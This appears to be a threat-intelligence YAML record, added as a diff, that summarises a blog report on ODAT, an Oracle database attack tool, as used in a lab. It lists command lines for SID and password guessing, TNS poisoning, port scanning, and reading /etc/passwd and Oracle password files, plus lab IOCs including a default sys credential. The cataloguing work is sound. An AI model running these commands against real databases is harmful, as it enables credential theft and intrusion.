@@ -1,0 +1,82 @@
+description: This report details the use of ODAT, a Python tool designed to exploit
+  Oracle databases. It covers various attack vectors including SID guessing, TNS poisoning,
+  file manipulation (upload/download/deletion), reverse shell exploitation, and SQL
+  shell access. The report also includes a demonstration using the HTB Silo machine.
+date: '2025-01-27'
+authors:
+- Karl Biron
+attribution: Unknown
+malware_families:
+- ODAT
+TTPs:
+  processes:
+  - python3
+  - bash
+  - cat
+  - echo
+  - ls
+  - tail
+  - ssh
+  - apache2
+  - crond
+  - atd
+  - docker-compose
+  - docker
+  - netcat
+  commandline:
+  - python3 ./odat.py -h
+  - sudo docker exec -it odat /bin/bash
+  - tail -f /dev/null
+  - sudo docker-compose up
+  - python3 ./odat.py sidguesser --test
+  - python3 ./odat.py snguesser --test
+  - python3 ./odat.py passwordguesser --accounts-file /root/odat/configs/passwords.txt
+    --logins-file-pwd /root/odat/configs/usernames.txt --test
+  - python3 ./odat.py tnscmd --ping
+  - python3 ./odat.py tnspoison --test-module
+  - python3 ./odat.py passwordguesser --accounts-file /root/odat/configs/passwords.txt
+    --logins-file-pwd /root/odat/configs/usernames.txt
+  - python3 ./odat.py utltcp --scan-ports 21,22,80,445,3306 --test-module
+  - python3 ./odat.py dbmsxslprocessor --get-file /etc/passwd
+  - cat /root/odat/.dbmsxslprocessor_output
+  - python3 ./odat.py dbmsxslprocessor --get-file tnsnames.ora
+  - cat /root/odat/.dbmsxslprocessor_output
+  - python3 ./odat.py dbmsxslprocessor --get-file sqlnet.ora
+  - cat /root/odat/.dbmsxslprocessor_output
+  - python3 ./odat.py dbmsxslprocessor --get-file listener.ora
+  - cat /root/odat/.dbmsxslprocessor_output
+  - python3 ./odat.py dbmsxslprocessor --get-file orapwFREE
+  - cat /root/odat/.dbmsxslprocessor_output
+  - tail - /dev/null
+  - python3 ./odat.py sidguesser -s 172.27.0.10 -p 1521
+  - python3 ./odat.py tnscmd -s 172.27.0.10 -p 1521 -d FREE -U sys ping
+  powershell: []
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections: []
+  file_modifications:
+  - /root/odat/.dbmsxslprocessor_output
+  - /tmp/utlfile_file_upload_test.txt
+  - sample_reverse_shell.sh
+  persistence: []
+  pipes: []
+  process_relations: []
+IOCs:
+- FREE (SID)
+- LISTENER (TNS Listener Alias)
+- sys/Oracle123 (Username/Password combination)
+- 172.27.0.10 (Oracle Database IP Address)
+- 172.27.0.20 (ODAT Docker Instance IP Address)
+- 172.27.0.30 (Metasploitable Docker Instance IP Address)
+- /etc/passwd
+- tnsnames.ora
+- sqlnet.ora
+- listener.ora
+- orapwFREE
+- 172.27.0.10
+- '1521'
+- FREE
+- LISTENER
+reference: https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/cracking-the-giant-how-odat-challenges-oracle-the-king-of-databases/
+file_creation_date: May 14, 2025
